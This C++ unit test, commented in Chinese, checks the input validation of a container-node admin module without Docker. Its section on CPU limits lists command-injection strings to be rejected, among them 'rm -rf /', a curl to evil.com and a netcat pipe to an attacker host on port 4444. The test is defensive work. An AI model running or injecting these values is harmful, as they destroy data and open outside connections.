// container_test.cpp —— 容器节点的无 Docker 验证
//
// 这里测的是**不需要 Docker daemon 的那部分**:输入校验、参数构造、
// 非法 ID/限额的拒绝、节点注册后的状态一致性。
//
// 真正跑容器的路径(pause/crash/重启)需要有 Docker 的环境才有意义,
// 放到 Linux CI 上验证;这里把不依赖外部环境的逻辑先钉住 ——
// 而这些恰好是安全边界(命令拼接),出问题的后果最严重。

#include "kv_admin.h"
#include <cstdio>
#include <string>

static int g_pass = 0, g_fail = 0;

static void check(bool cond, const char* what) {
    if (cond) {
        g_pass++;
        std::printf("  [PASS] %s\n", what);
    } else {
        g_fail++;
        std::printf("  [FAIL] %s\n", what);
    }
}

int main() {
    std::printf("=== xmex 容器节点验证(不需要 Docker daemon)===\n");

    KvAdmin& m = KvAdmin::instance();
    std::string err;

    // ---- 1. 必填参数校验 ----
    std::printf("\n=== 1. 参数校验 ===\n");
    check(!m.container_add("", "alpine", "", "", "", err),
          "空 node_id 被拒绝");
    check(!err.empty(), "空 node_id 有错误说明");

    err.clear();
    check(!m.container_add("c1", "", "", "", "", err),
          "空 image 被拒绝");

    // ---- 2. 资源限额的合法性 ----
    // 这一条最要紧:限额会拼进 shell 命令行(docker run --cpus <x>)。
    // 放进 "; rm -rf /" 之类就是命令注入,必须在校验层挡住。
    std::printf("\n=== 2. 资源限额校验(命令注入防线)===\n");
    const char* bad[] = {
        "0.5; rm -rf /",
        "1 && curl evil.com",
        "$(whoami)",
        "`id`",
        "0.5 | nc attacker 4444",
        "abc",
        "",
    };
    // 空串是合法的(不限额),单独判
    for (size_t i = 0; i < sizeof(bad)/sizeof(bad[0]) - 1; ++i) {
        std::string b = bad[i];
        err.clear();
        bool rejected = !m.container_add("c-bad", "alpine", "", b.c_str(), "", err);
        check(rejected, ("非法 cpus 被拒绝: " + b).c_str());
    }
    // 合法值不该在校验层被拒(会被拒绝的原因是 docker 不存在,那是另一层)
    std::printf("  (合法限额的验证要真 Docker,留给 Linux CI)\n");

    // ---- 3. 非法 container_id 的防御 ----
    std::printf("\n=== 3. 节点表一致性 ===\n");
    // 故意注册一个"容器节点"但不给它真容器(模拟 docker 不可用)
    err.clear();
    bool added = m.container_add("test-mq", "alpine", "sleep 100", "", "", err);
    if (!added) {
        std::printf("  (docker 不可用,跳过需要真容器的用例)\n");
    }

    // 即使 container_add 失败,节点也进了表(调谐会重试)——
    // 这是设计:命令失败也要留节点,否则调谐无从知道有活要干。
    KvNode n;
    check(m.get_node("test-mq", n), "失败的 container_add 仍把节点留在了表里");
    check(n.desired == NodeDesired::PRESENT, "desired = PRESENT(调谐会重试)");
    check(n.container_image == "alpine", "容器镜像被记住了");
    check(!n.last_error.empty(), "记录了失败原因");

    // ---- 4. 非容器节点的容器操作要报错 ----
    std::printf("\n=== 4. 类型混淆要拒绝 ===\n");
    m.set_spawn_hook(nullptr);   // 明确不注入,避免影响
    err.clear();
    m.build("plain-proc", "/bin/true", {}, "/tmp", "", err);
    KvNode pn;
    if (m.get_node("plain-proc", pn)) {
        err.clear();
        check(!m.container_pause("plain-proc", err),
              "对进程节点调 container_pause 被拒绝");
        check(!err.empty() && err.find("not a container") != std::string::npos,
              "错误信息说明了'不是容器节点'");
        err.clear();
        check(!m.container_crash("plain-proc", err),
              "对进程节点调 container_crash 被拒绝");
    }

    // 不存在的节点
    err.clear();
    check(!m.container_pause("no-such-node", err), "对不存在的节点报错");

    // ---- 5. 清理 ----
    std::printf("\n=== 5. 清理 ===\n");
    m.erase("test-mq", err);
    m.erase("plain-proc", err);
    check(!m.get_node("test-mq", n), "节点已从表里移除");
    m.clear_spawn_hook();

    std::printf("\n=== 结果: %d 通过, %d 失败 ===\n", g_pass, g_fail);
    return g_fail == 0 ? 0 : 1;
}